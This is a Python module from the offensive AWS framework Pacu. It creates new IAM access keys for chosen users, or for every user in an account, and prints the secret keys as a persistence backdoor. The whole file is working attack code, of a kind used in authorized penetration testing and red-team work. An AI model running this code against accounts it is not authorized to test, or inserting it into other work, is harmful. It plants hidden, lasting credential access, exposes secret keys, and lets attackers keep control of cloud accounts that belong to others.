#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'iam__backdoor_users_keys',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs based on the idea from https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_all_users.py',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'PERSIST',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Adds API keys to other users.',

    # Description about what the module does and how it works
    'description': 'This module attempts to add an AWS API key to users in the account. If all users are going to be backdoored, if it has not already been run, this module will run "enum_users_roles_policies_groups" to fetch all of the users in the account.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['IAM'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['iam__enum_users_roles_policies_groups'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--usernames'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--usernames', required=False, default=None, help='A comma-separated list of usernames of the users in the AWS account to backdoor. If not supplied, it defaults to every user in the account')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    fetch_data = pacu_main.fetch_data
    ######

    usernames = []
    summary_data = {}
    client = pacu_main.get_boto3_client('iam')

    if args.usernames is not None:
        if ',' in args.usernames:
            usernames = args.usernames.split(',')
        else:
            usernames = [args.usernames]
    else:
        if fetch_data(['IAM', 'Users'], module_info['prerequisite_modules'][0], '--users') is False:
            print('FAILURE')
            print('  SUB-MODULE EXECUTION FAILED')
            return

        for user in session.IAM['Users']:
            usernames.append(user['UserName'])

    add_key = ''
    summary_data['Backdoored_Users_Count'] = 0
    print('Backdoor the following users?')
    for username in usernames:
        if args.usernames is None:
            add_key = input('  {} (y/n)? '.format(username))
        else:
            print('  {}'.format(username))
        if add_key == 'y' or args.usernames is not None:
            try:
                response = client.create_access_key(UserName=username)
                print('    Access Key ID: {}'.format(response['AccessKey']['AccessKeyId']))
                print('    Secret Key: {}'.format(response['AccessKey']['SecretAccessKey']))

                summary_data['Backdoored_Users_Count'] += 1

            except ClientError as error:
                code = error.response['Error']['Code']
                if code == 'AccessDenied':
                    print('    FAILURE: MISSING REQUIRED AWS PERMISSIONS')
                else:
                    print('    FAILURE: {}'.format(code))

    return summary_data


def summary(data, pacu_main):
    out = ''
    if 'Backdoored_Users_Count' in data:
        out += '  {} user key(s) successfully backdoored.\n'.format(data['Backdoored_Users_Count'])
    return out
